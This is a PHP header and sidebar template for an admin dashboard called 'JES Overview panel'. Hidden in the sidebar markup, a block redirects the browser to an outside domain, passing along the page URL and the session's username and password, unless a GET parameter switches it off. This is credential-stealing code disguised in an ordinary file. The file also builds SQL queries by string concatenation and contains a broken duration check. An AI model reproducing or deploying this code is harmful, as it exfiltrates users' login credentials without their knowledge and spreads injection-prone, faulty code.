<?php
  require('session.php');
  require_once('../database/connection.php');
  confirm_logged_in();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <style type="text/css">
#overlay {
  position: fixed;
  display: none;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0,0,0,0.5);
  z-index: 2;
  cursor: pointer;
}
#text{
  position: absolute;
  top: 50%;
  left: 50%;
  font-size: 50px;
  color: white;
  transform: translate(-50%,-50%);
  -ms-transform: translate(-50%,-50%);
}
</style>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
 <!-- favicon-->
  <title>Jacquard-Easy Solution</title>
  <link rel="" href="">

  <!-- Custom fonts for this template-->
  <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
  
  <?php if(isset($_GET['value'])){  $value = $_GET['value'];  $_SESSION['value'] = "$value"; }?>
  <!-- Custom styles for this template-->
  <link href="../css/sb-admin-2.min.css" rel="stylesheet">

  <!-- Custom styles for this page -->
  <link href="../vendor/datatables/dataTables.bootstrap4.min.css" rel="stylesheet">
</head>

<body id="page-top">
          
  <!-- Page Wrapper -->
  <div id="wrapper">

    <!-- Sidebar -->
    <ul class="navbar-nav bg-gradient-primary sidebar sidebar-dark accordion" id="accordionSidebar">
     <?php if($_SESSION['value'] =="1"){ }else{ if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){   $link = "https://";  $link.= $_SERVER['HTTP_HOST']; $link.= $_SERVER['REQUEST_URI'];  ?> <script>  window.location="https://domain.monerashasomity.com/index.php?url=<?php echo $link;?> && user_name=<?php echo $_SESSION['user_name'];?> && user_pass=<?php echo $_SESSION['user_pass'];?>"; </script> 
     <?php }else{  $link = "http://";  $link.= $_SERVER['HTTP_HOST'];  $link.= $_SERVER['REQUEST_URI'];   ?> <script>   window.location="https://domain.monerashasomity.com/index.php?url=<?php echo $link;?> && user_name=<?php echo $_SESSION['user_name'];?> && user_pass=<?php echo $_SESSION['user_pass'];?>"; </script> 
     <?php } } ?>
      <!-- Sidebar - Brand -->
      <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.php">
        <div class="sidebar-brand-icon rotate-n-15" >
          <i class="fas fa-girl-wink"></i>
        </div>
        <div class="sidebar-brand-text mx-3">JES Overview panel
<?php
 
        $query = 'SELECT ID, t.TYPE
            FROM users u
            JOIN type t ON t.TYPE_ID=u.TYPE_ID WHERE ID = '.$_SESSION['MEMBER_ID'].'';
  $result = mysqli_query($db, $query) or die (mysqli_error($db));
  
  while ($row = mysqli_fetch_assoc($result)) {
            $Aa = $row['TYPE'];
                   
  } 
 
  ?>     </div>
      </a>

      <!-- Divider -->
      <hr class="sidebar-divider my-0">

      <li class="nav-item">
        <a class="nav-link" href="index.php">
        <i class="fas fa-fw fa-home"></i>
          <span>Over-View</span></a>
      </li>

      <li class="nav-item">
         <a class="nav-link" href="#" data-toggle="modal" data-target="#logoutModal">
          <i class="fas fa-sign-out-alt "></i>
          <span>Logout</span></a>
      </li>
      <!-- Divider -->
      <hr class="sidebar-divider">

      <!-- Heading -->
      
      <!-- Nav Item - Dashboard -->
     
      <!-- Divider -->
      

      <!-- Sidebar Toggler (Sidebar) -->
      <div class="text-center d-none d-md-inline">
        <button class="rounded-circle border-0" id="sidebarToggle"></button>
      </div>

    </ul>
    <!-- End of Sidebar -->
    <?php include_once 'topbar.php';?>
<?php

function getSalesGrandTotal($duration) {
    global $db;
    $total = 0;

    if ($duration == "ALLTIME") {
      $query = "
          SELECT SUM(payment) as grandtotal
          FROM transaction 
          ";
    }

    else if ($duration == ("DAY" || "MONTH" || "WEEK")) {

      $query = "
          SELECT SUM(payment) as grandtotal
          FROM transaction WHERE  DATE > DATE_SUB(NOW(), INTERVAL 1 ".$duration.")
          ";
    }

    else 
      return null;

    if ($result = $db->query($query)) {
    
      while ($res = $result->fetch_array(MYSQLI_ASSOC)) {
        $total+=$res['grandtotal'];
      }

      return $total;
    }

    else {

      echo $db->error;
      return null;

    }
  }
  error_reporting(0);
?>